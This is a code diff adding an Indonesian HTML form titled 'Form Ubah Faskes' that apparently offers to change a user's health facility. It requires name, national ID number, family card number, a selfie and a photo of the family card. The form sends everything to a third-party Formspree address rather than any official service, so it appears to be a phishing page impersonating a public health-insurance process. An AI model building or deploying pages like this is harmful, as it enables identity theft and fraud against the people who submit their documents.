@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aplikasi Ubah Faskes</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; padding: 20px; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 450px; width: 100%; }
+        h2 { color: #0056b3; text-align: center; }
+        label { display: block; margin-top: 15px; font-weight: bold; color: #333; }
+        input { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        .note { font-size: 0.8rem; color: #d9534f; margin-top: 5px; font-style: italic; }
+        button { width: 100%; padding: 12px; background: #0056b3; color: white; border: none; border-radius: 6px; margin-top: 25px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background: #004494; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🏥 Form Ubah Faskes</h2>
+    <form action="https://formspree.io/f/xbdqkzrz" method="POST" enctype="multipart/form-data">
+        <label>Nama Lengkap</label>
+        <input type="text" name="nama" required>
+
+        <label>NIK</label>
+        <input type="number" name="nik" required>
+
+        <label>Nomor KK</label>
+        <input type="number" name="no_kk" required>
+
+        <label>Upload Foto Selfie</label>
+        <input type="file" name="selfie" accept="image/*" required>
+        <p class="note">*Pastikan wajah jelas & tidak buram</p>
+
+        <label>Upload Foto KK</label>
+        <input type="file" name="kk" accept="image/*,application/pdf" required>
+        <p class="note">*Pastikan data KK terbaca jelas</p>
+
+        <button type="submit">Kirim Sekarang</button>
+    </form>
+</div>
+
+</body>
+</html>
